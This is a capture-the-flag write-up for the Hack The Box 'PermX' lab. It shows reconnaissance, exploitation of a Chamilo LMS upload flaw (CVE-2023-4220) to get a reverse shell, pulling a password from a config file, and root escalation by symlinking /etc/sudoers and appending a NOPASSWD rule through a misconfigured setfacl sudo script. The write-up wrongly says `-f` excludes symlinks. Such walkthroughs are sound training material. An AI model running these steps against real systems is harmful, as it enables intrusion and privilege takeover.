# PermX - Ashbo3n

**Machine Name:** PermX

**Rating:** 4.6

**Area Of Interest:** <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Upload And Sudo Misconfiguration</span>

## <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Initial Shell - </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Upload</span>

<span class="chip__text htb-body-md htb-text-primary htb-font-medium">**Nmap**</span>

```bash
# Nmap 7.95 scan initiated Tue Jan 13 03:19:43 2026 as: /usr/lib/nmap/nmap -p- -sVC -oN nmap --min-rate=5000 -vv 10.129.35.109
Increasing send delay for 10.129.35.109 from 0 to 5 due to 594 out of 1979 dropped probes since last increase.
Increasing send delay for 10.129.35.109 from 10 to 20 due to 251 out of 835 dropped probes since last increase.
Nmap scan report for 10.129.35.109
Host is up, received echo-reply ttl 63 (0.24s latency).
Scanned at 2026-01-13 03:19:44 IST for 50s
Not shown: 63129 closed tcp ports (reset), 2404 filtered tcp ports (no-response)
PORT   STATE SERVICE    REASON         VERSION
22/tcp open  tcpwrapped syn-ack ttl 63
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped syn-ack ttl 63
| http-methods: 
|_  Supported Methods: POST OPTIONS
|_http-title: Did not follow redirect to http://permx.htb

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 13 03:20:34 2026 -- 1 IP address (1 host up) scanned in 50.70 seconds

```

Moving on to port 80, add permx.htb to your /etc/hosts file.

Running ffuf with this command:

```bash
──(root㉿kali)-[~/HTB/PermX]
└─# ffuf -c -u http://permx.htb/FUZZ -w ~/wordlist/directory-list-2.3-medium.txt -t 60 -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /root/wordlist/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

LICENSE.txt             [Status: 200, Size: 1422, Words: 253, Lines: 35, Duration: 229ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 228ms]
img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 228ms]
index.html              [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 229ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 228ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 228ms]
img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 227ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 228ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 229ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 230ms]
```

Found 2 VHOSTS:

```
┌──(root㉿kali)-[~/HTB/PermX]
└─# ffuf -c -u http://permx.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host: FUZZ.permx.htb" -t 60 -ic -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 60
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 233ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 2660ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

and on [http://lms.permx.htb/documentation/](http://lms.permx.htb/documentation/) we can see lms version, while searching online i found this repo: [https://github.com/oxapavan/CVE-2023-4220-HTB-PermX](https://github.com/oxapavan/CVE-2023-4220-HTB-PermX)

**Exploitation**

Download the repo and run it, Example usage follows the following:

```bash
┌──(root㉿kali)-[~/HTB/PermX/Exploit]
└─# ./Exploit.sh

========================================
  Chamilo LMS Security Research Tool    
========================================

Error: All options -f, -h, and -p are required
Usage: Exploit.sh -f <reverse_file> -h <host_link> -p <port>

Options:
    -f    Path to the test file
    -h    Target host URL for testing
    -p    Port number for connection test
    -?    Show this help message

Example:
    Exploit.sh -f test.php -h http://example.com -p 8080

```

After running it you can go to [http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/](http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/) and you should see your reverse shell file, to run it click on it and in your listern you should get a shell.

Got a shell and now go to `/var/www/chamilo/app/config/` and transfer over configuration.php to your attack machine and now open it and you could see password on the starting of the file. Viewing `/etc/passwd` we can see a user:

```
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

We can ssh into this user with mtz and the found password.

```
┌──(root㉿kali)-[~/HTB/PermX]
└─# ssh mtz@10.129.35.109                       
mtz@10.129.35.109's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jan 12 10:46:05 PM UTC 2026

  System load:           0.01
  Usage of /:            59.3% of 7.19GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             236
  Users logged in:       0
  IPv4 address for eth0: 10.129.35.109
  IPv6 address for eth0: dead:beef::250:56ff:feb0:6f63


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jan 12 22:46:07 2026 from 10.10.15.197
mtz@permx:~$ cat user.txt
Redacted!
```

User Flag Obtained, Moving forward to root.

## Root - Sudo Misconfiguration

as soon as i entered and got the user flag i ran sudo -l to see what can i run as root. And i can run `(ALL : ALL) NOPASSWD: /opt/acl.sh` as root, apon viewing the acl.sh file:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

This script is a wrapper for the `setfacl` command, designed to allow a user to modify **Access Control Lists (ACLs)** for specific files within a restricted directory scope.

**Script Breakdown**

- **Argument Validation**: It requires exactly three arguments: a `user`, the `perm` (permissions, e.g., `rwx`), and the `target` file.
- **Path Restriction**: It implements a security check to ensure the `$target` is located within `/home/mtz/` and does not contain `..` (preventing directory traversal attacks).
- **File Verification**: It uses `[ ! -f "$target" ]` to ensure the target is a regular file, not a directory or a symlink.
- **The Execution**: It runs `setfacl` via `sudo` to grant the specified user the defined permissions on the target file.

Exploitation:

Create a symbolic link first:

```bash
ln -s /etc/sudoers root
```

then use acl.sh script to give read and write permissions to the linked file

```bash
sudo /opt/acl.sh mtz rw /home/mtz/root
```

Next append a line to the /etc/sudoers file via the symbolic link to allow the mtz user to execute any command as root without a password

```bash
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
```

And lastly we got the flag:

```bash
mtz@permx:~$ ln -s /etc/sudoers root
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
mtz@permx:~$ sudo bash
root@permx:/home/mtz# cat /root/root.txt
Redacted!
root@permx:/home/mtz# 
```